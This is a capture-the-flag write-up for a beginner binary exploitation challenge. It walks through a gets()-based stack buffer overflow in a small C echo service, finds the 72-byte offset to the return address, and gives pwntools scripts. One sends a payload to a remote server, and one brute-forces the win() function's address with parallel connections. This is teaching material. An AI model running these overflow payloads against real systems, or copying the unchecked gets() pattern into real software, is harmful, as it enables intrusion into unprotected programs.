## Assignment

Category: PWN
Difficulty: Beginner

The Relay rebooted an old diagnostic process — it just echoes back whatever you send it. Simple by design.

But it's still carrying dead code from before the blackout: a function that's never called, sitting untouched in memory. Redirect the program into it.

Connection string: nc 34.116.80.78 9998 Flag Format : CSSCTF{...}

## Reconnaissance

We are provided with the C source code of the challenge, `echo.c`

```c
include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win() {
    printf("\nYou hijacked the return address!\n");
    printf("Here's your flag:\n");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("Error: flag.txt not found on server.\n");
        exit(1);
    }
    char flag[128];
    if (fgets(flag, sizeof(flag), f)) {
        printf("%s\n", flag);
    }
    fclose(f);
    exit(0);
}

void vuln() {
    char buffer[64];
    printf("This program is a simple echo service.\n");
    printf("Enter your message: ");
    gets(buffer);  // VULNERABLE: no bounds checking!
    printf("You said: %s\n", buffer);
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    printf("Goodbye!\n");
    return 0;
}
```

By reading the code, it is clear that the `gets(buffer)` function is vulnerable to a buffer overflow because it does not perform any bounds checking. Furthermore, the description hints that we need to execute a function sitting untouched in memory. Looking at `echo.c`, this is clearly the `win()` function, which reads and prints the flag.

Since we don't have the compiled binary from the server, we can assume the challenge is compiled without stack protection (canaries) and without PIE (Position Independent Executable), meaning the memory addresses are static. I compiled the source locally to analyze it:

`gcc echo.c -o /tmp/echo -fno-stack-protector -no-pie`

<img width="830" height="85" alt="Pasted image 20261001211712" src="https://github.com/user-attachments/assets/b840dcea-8540-4150-bd7c-d6da9149c25b" />

We see that gets is not supported so we will run it as following.

<img width="695" height="89" alt="Pasted image 20261001211724" src="https://github.com/user-attachments/assets/9a8e9f8c-8d06-4218-907f-6fc61e9bcc47" />

_(Note: `gets` is dangerous and will trigger a compiler warning, which we can ignore here.)_

Next, I needed to find the address of the `win` function and calculate the required offset to overwrite the return address (RIP). To do this, I run the following command.

<img width="561" height="30" alt="Pasted image 20261001211948" src="https://github.com/user-attachments/assets/47957eab-9d8b-4410-8a46-42b1c4c290e7" />

Now we need to know ho much we can override the stack. To do this we need to see the main a `vuln` function. To do this, I disassembled the binary using `objdump`.

`objdump -d ./echo`

Output:

<img width="813" height="591" alt="Pasted image 20261001212707" src="https://github.com/user-attachments/assets/d5e82466-869b-4d25-9501-15988447386c" />

In the disassembly of the `vuln` function, we can see how the stack frame is constructed. First, when the function is called, the return address (`RIP`) is pushed onto the stack. Next, the old base pointer is saved (`push %rbp`, 8 bytes). Finally, `0x40` (64 bytes) of space is allocated for our buffer (`sub $0x40, %rsp`).

Because our input fills the buffer from the lowest address towards the higher addresses, it will overwrite this structure from the bottom up. Therefore, to hijack the execution flow, we need to send exactly **72 bytes** (64 bytes to fill the buffer + 8 bytes to overwrite the saved `RBP`), followed directly by the address of the `win` function to overwrite the `RIP`.
## Exploitation

To exploit this, I wrote a basic Python script using `pwntools`:

``` python
from pwn import *

context.binary = './echo'

p = remote('34.116.80.78', 9998)

win = 0x4011a6

payload = b"A" * 72

payload += p64(win)

p.send(payload)

p.interactive()
```

Output:

<img width="874" height="239" alt="Pasted image 20261001213811" src="https://github.com/user-attachments/assets/a1355f20-5bfb-4f1a-af5b-330dc82c13c5" />

However, executing this against the remote server did not work. The program crashed, confirming that the overflow was successful, but we didn't jump to the correct function. This probably happens because the remote server uses  different function addresses.

To solve this, I wrote a modified script to brute-force the address of the `win` function. I scanned a small memory range around my local address (`0x4010a6` to `0x4012a7`) using a `ThreadPoolExecutor` to speed up the process.

``` python
from pwn import *
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST = "34.116.80.78"
PORT = 9998

context.log_level = "error"

def try_addr(addr):
    try:
        p = remote(HOST, PORT, timeout=2)

        p.recvuntil(b"Enter your message:")

        payload = b"A" * 72 + p64(addr)
        p.sendline(payload)

        data = p.recvall(timeout=1)
        p.close()

        if b"You hijacked" in data or b"CSSCTF{" in data:
            return addr, data

    except Exception:
        pass

    return None


addresses = range(0x4010a6, 0x4012a7)

with ThreadPoolExecutor(max_workers=20) as pool:
    futures = [pool.submit(try_addr, addr) for addr in addresses]

    for future in as_completed(futures):
        result = future.result()

        if result:
            addr, data = result

            print(f"[+] FOUND: {addr:#x}")
            print(data.decode(errors="replace"))

            pool.shutdown(wait=False, cancel_futures=True)
            break
```

Output:

<img width="808" height="437" alt="Pasted image 20261001214411" src="https://github.com/user-attachments/assets/249904ef-bb59-47a9-9766-32cd511350cf" />

BINGO! The script successfully found the correct remote address for the `win` function and retrieved the flag.
